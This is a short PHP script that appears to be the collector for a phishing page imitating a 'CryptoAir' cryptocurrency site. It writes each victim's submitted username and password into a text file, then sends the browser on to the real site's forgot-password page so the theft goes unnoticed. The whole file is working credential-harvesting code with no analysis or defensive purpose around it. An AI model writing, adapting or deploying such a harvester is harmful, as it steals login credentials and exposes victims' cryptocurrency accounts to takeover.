<?php
file_put_contents("usernames.txt", "CryptoAir Username: " . $_POST["username"] . "\nPassword: ". $_POST["password"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://cryptoair.ltd/?a=forgot_password
header("Location: $url");
exit();
?>
